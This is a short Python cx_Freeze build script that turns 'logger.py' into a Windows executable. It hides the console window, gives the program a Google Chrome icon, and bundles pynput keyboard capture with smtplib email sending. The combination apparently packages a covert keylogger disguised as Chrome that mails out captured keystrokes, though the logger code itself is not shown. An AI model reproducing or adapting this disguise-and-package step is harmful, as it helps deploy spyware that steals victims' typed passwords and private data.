from cx_Freeze import setup, Executable

import sys
base = None

if (sys.platform == "win32"):

    base = "Win32GUI"

executables = [Executable("logger.py", base=base, icon="Google-Chrome-Google-Chrome.ico")]

packages = ["idna", "pynput", "threading", "smtplib", "time"]
options = {
    'build_exe': {
        'packages': packages,
    },
}

setup(
    name="LOGER",
    options=options,
    version="1.0",
    description='',
    executables=executables
)